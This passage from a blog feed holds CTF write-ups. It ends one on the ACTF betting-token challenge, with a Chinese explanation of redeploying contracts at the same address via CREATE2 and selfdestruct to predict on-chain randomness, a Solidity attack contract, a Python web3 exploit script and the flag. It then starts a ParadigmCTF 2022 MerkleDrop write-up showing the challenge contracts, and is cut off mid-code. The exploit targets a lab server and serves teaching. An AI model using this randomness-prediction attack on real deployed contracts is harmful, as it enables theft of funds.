punctuation">)</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>说明：</p><p>● address— 调用CREATE2的智能合约的地址</p><p>● salt— 随机数</p><p>● init_code— 要部署合约的字节码</p><p>可以在合约<strong>构造函数constructor</strong>中完成我们想要进行的操作，然后调用selfdestruct（）。与常见错误认识相反，其实你可以使用CREATE2操作码在同一地址多次部署智能合约。这是因为CREATE2检查目标地址的 nonce 是否为零（它会在构造函数的开头将其设置为1）。在这种情况下，selfdestruct（）函数每次都会重置地址的 nonce。因此，如果再次使用相同的参数调用CREATE2创建合约，对nonce的检查是可以通过的。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p><strong>攻击合约</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./bet.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Hacker</span> <span class="token punctuation">{</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> target<span class="token punctuation">,</span> <span class="token builtin">uint256</span> mod<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        BigHacker b <span class="token operator">=</span> <span class="token function">BigHacker</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> nonce <span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">nonce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        BetToken t <span class="token operator">=</span> <span class="token function">BetToken</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">balances</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            t<span class="token punctuation">.</span><span class="token function">airdrop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        value <span class="token operator">=</span> <span class="token function">Hack</span><span class="token punctuation">(</span>nonce<span class="token punctuation">,</span> mod<span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">bet</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> mod<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">Hack</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> nonce<span class="token punctuation">,</span> <span class="token builtin">uint256</span> mod<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">uint256</span> rand <span class="token operator">=</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span>            <span class="token function">keccak256</span><span class="token punctuation">(</span>                abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>                    nonce<span class="token punctuation">,</span>                    block<span class="token punctuation">.</span>timestamp<span class="token punctuation">,</span>                    block<span class="token punctuation">.</span>difficulty<span class="token punctuation">,</span>                    <span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>                <span class="token punctuation">)</span>            <span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span>        <span class="token keyword">return</span> rand<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">BigHacker</span> <span class="token punctuation">{</span>        Hacker hk<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> a<span class="token punctuation">;</span>    <span class="token keyword">event</span> <span class="token function">log_address</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> s <span class="token operator">=</span> hex<span class="token string">"42"</span><span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> nonce<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _nonce<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        nonce <span class="token operator">=</span> _nonce<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">Hack</span><span class="token punctuation">(</span><span class="token builtin">address</span> target<span class="token punctuation">,</span> <span class="token builtin">uint256</span> mod<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        hk <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">{</span>salt<span class="token punctuation">:</span> s<span class="token punctuation">}</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> mod<span class="token punctuation">)</span><span class="token punctuation">;</span>        nonce<span class="token operator">++</span><span class="token punctuation">;</span>        a <span class="token operator">=</span> <span class="token builtin">address</span><span class="token punctuation">(</span>hk<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">emit</span> <span class="token function">log_address</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        hk<span class="token punctuation">.</span><span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>交互部署脚本</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">from</span> eth_hash <span class="token keyword">import</span> Keccak256<span class="token keyword">from</span> web3 <span class="token keyword">import</span> Web3<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_longw3 <span class="token operator">=</span> Web3<span class="token punctuation">(</span>Web3<span class="token punctuation">.</span>HTTPProvider<span class="token punctuation">(</span><span class="token string">'http://123.60.36.208:8545/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>BigHacker_bytecode <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output/BigHacker.bin'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>BigHacker_abi <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output/BigHacker.abi'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>Hacker_bytecode <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output/Hacker.bin'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>acc <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>hacker<span class="token punctuation">,</span> sk_hacker <span class="token operator">=</span> acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> acc<span class="token punctuation">.</span>key<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] hacker:'</span><span class="token punctuation">,</span> hacker<span class="token punctuation">)</span><span class="token keyword">assert</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://123.60.36.208:8080/api/claim'</span></span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'address'</span><span class="token punctuation">:</span> hacker<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] waiting for test ether'</span><span class="token punctuation">)</span><span class="token keyword">while</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_balance<span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] exploit start'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">deploy</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> data<span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>        <span class="token string">"chainId"</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>        <span class="token string">"from"</span><span class="token punctuation">:</span> src<span class="token punctuation">,</span>        <span class="token string">"gasPrice"</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"gas"</span><span class="token punctuation">:</span> <span class="token number">4700000</span><span class="token punctuation">,</span>        <span class="token string">"value"</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span>value<span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"nonce"</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">"data"</span><span class="token punctuation">:</span> data<span class="token punctuation">}</span>nonce <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getStorageAt<span class="token punctuation">(</span><span class="token string">'0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>BigHacker_bytecode <span class="token operator">+=</span> nonce<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>signed_txn <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>deploy<span class="token punctuation">(</span>hacker<span class="token punctuation">,</span> BigHacker_bytecode<span class="token punctuation">)</span><span class="token punctuation">,</span> sk_hacker<span class="token punctuation">)</span>txn_hash <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>txn_receipt <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash<span class="token punctuation">)</span>target <span class="token operator">=</span> txn_receipt<span class="token punctuation">[</span><span class="token string">'contractAddress'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] BigHacker address:'</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span>contract <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>contract<span class="token punctuation">(</span>address<span class="token operator">=</span>target<span class="token punctuation">,</span> abi<span class="token operator">=</span>BigHacker_abi<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] attacking... Round:'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>    TransactionData <span class="token operator">=</span> contract<span class="token punctuation">.</span>functions<span class="token punctuation">[</span><span class="token string">'Hack'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'0x21ac0df70A628cdB042Dde6f4Eb6Cf49bDE00Ff7'</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">.</span>buildTransaction<span class="token punctuation">(</span><span class="token punctuation">{</span>        <span class="token string">'chainId'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>chain_id<span class="token punctuation">,</span>        <span class="token string">'from'</span><span class="token punctuation">:</span> hacker<span class="token punctuation">,</span>        <span class="token string">'gas'</span><span class="token punctuation">:</span> <span class="token number">4700000</span><span class="token punctuation">,</span>        <span class="token string">'gasPrice'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'nonce'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>getTransactionCount<span class="token punctuation">(</span>hacker<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token string">'value'</span><span class="token punctuation">:</span> w3<span class="token punctuation">.</span>toWei<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wei'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    signed_txn1 <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>account<span class="token punctuation">.</span>signTransaction<span class="token punctuation">(</span>TransactionData<span class="token punctuation">,</span> sk_hacker<span class="token punctuation">)</span>    txn_hash1 <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>sendRawTransaction<span class="token punctuation">(</span>signed_txn1<span class="token punctuation">.</span>rawTransaction<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    txn_receipt1 <span class="token operator">=</span> w3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>waitForTransactionReceipt<span class="token punctuation">(</span>txn_hash1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ACTF{a_sTup1d_W3B_VUl_M4y_1e@D_7o_s3rIou$_w3b3_ImP4C7_666}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><a href="https://learnblockchain.cn/article/1297.html">通过CREATE2获得合约地址：解决交易所充值账号问题</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ParadigmCTF 2022 MerkleDrop writeup</title>
      <link href="/2022/08/31/paradigmctf-2022-merkledrop-writeup/"/>
      <url>/2022/08/31/paradigmctf-2022-merkledrop-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="MerkleDrop"><a href="#MerkleDrop" class="headerlink" title="MerkleDrop"></a>MerkleDrop</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><strong>Setup.sol</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.16</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./MerkleDistributor.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Token</span> <span class="token keyword">is</span> ERC20Like <span class="token punctuation">{</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balanceOf<span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">public</span> allowance<span class="token punctuation">;</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> totalSupply <span class="token operator">=</span> <span class="token number">1</span>_000_000 ether<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        balanceOf<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">=</span> totalSupply<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        allowance<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">from</span> <span class="token operator">!=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span> <span class="token punctuation">{</span>            allowance<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span><span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        balanceOf<span class="token punctuation">[</span><span class="token keyword">from</span><span class="token punctuation">]</span> <span class="token operator">-=</span> amount<span class="token punctuation">;</span>        balanceOf<span class="token punctuation">[</span>to<span class="token punctuation">]</span> <span class="token operator">+=</span> amount<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">Setup</span> <span class="token punctuation">{</span>    Token <span class="token keyword">public</span> immutable token<span class="token punctuation">;</span>    MerkleDistributor <span class="token keyword">public</span> immutable merkleDistributor<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">{</span>        token <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> airdropAmount <span class="token operator">=</span> <span class="token number">75000</span> <span class="token operator">*</span> <span class="token number">10</span> <span class="token operator">**</span> <span class="token number">18</span><span class="token punctuation">;</span>        merkleDistributor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MerkleDistributor</span><span class="token punctuation">(</span>            <span class="token builtin">address</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">,</span>             <span class="token builtin">bytes32</span><span class="token punctuation">(</span><span class="token number">0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        token<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>merkleDistributor<span class="token punctuation">)</span><span class="token punctuation">,</span> airdropAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">bool</span> condition1 <span class="token operator">=</span> token<span class="token punctuation">.</span><span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span>merkleDistributor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token builtin">bool</span> condition2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>merkleDistributor<span class="token punctuation">.</span><span class="token function">isClaimed</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                condition2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> condition1 <span class="token operator">&amp;&amp;</span> condition2<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>MerkleDistributor.sol</strong></p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: UNLICENSED</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token number">0.8</span><span class="token number">.15</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./MerkleProof.sol"</span><span class="token punctuation">;</span><span class="token keyword">interface</span> <span class="token class-name">ERC20Like</span> <span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> dst<span class="token punctuation">,</span> <span class="token builtin">uint</span> qty<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">contract</span> <span class="token class-name">MerkleDistributor</span> <span class="token punctuation">{</span>    <span class="token keyword">event</span> <span class="token function">Claimed</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> immutable token<span class="token punctuation">;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">public</span> immutable merkleRoot<span class="token punctuation">;</span>    <span class="token comment">// This is a packed array of booleans.</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> <span class="token operator">=&gt;</span> <span class="token builtin">uint256</span><span class="token punctuation">)</span> <span class="token keyword">private</span> claimedBitMap<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> token_<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> merkleRoot_<span class="token punctuation">)</span> <span class="token punctuation">{</span>        token <span class="token operator">=</span> token_<span class="token punctuation">;</span>        merkleRoot <span class="token operator">=</span> merkleRoot_<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isClaimed</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token builtin">uint256</span> claimedWordIndex <span class="token operator">=</span> index <span class="token operator">/</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> claimedBitIndex <span class="token operator">=</span> index <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> claimedWord <span class="token operator">=</span> claimedBitMap<span class="token punctuation">[</span>claimedWordIndex<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> mask <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> claimedBitIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> claimedWord <span class="token operator">&amp;</span> mask <span class="token operator">==</span> mask<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">_setClaimed</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token punctuation">{</span>        <span class="token builtin">uint256</span> claimedWordIndex <span class="token operator">=</span> index <span class="token operator">/</span> <span class="token number">256</span><span class="token punctuation">;</span>        <span class="token builtin">uint256</span> claimedBitIndex <span class="token operator">=</span> index <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span>        claimedBitMap<span class="token punctuation">[</span>claimedWordIndex<span class="token punctuation">]</span> <span class="token operator">=</span> claimedBitMap<span class="token punctuation">[</span>claimedWordIndex<span class="token punctuation">]</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> claimedBitIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">claim</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> index<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">,</span> <span class="token builtin">uint96</span> 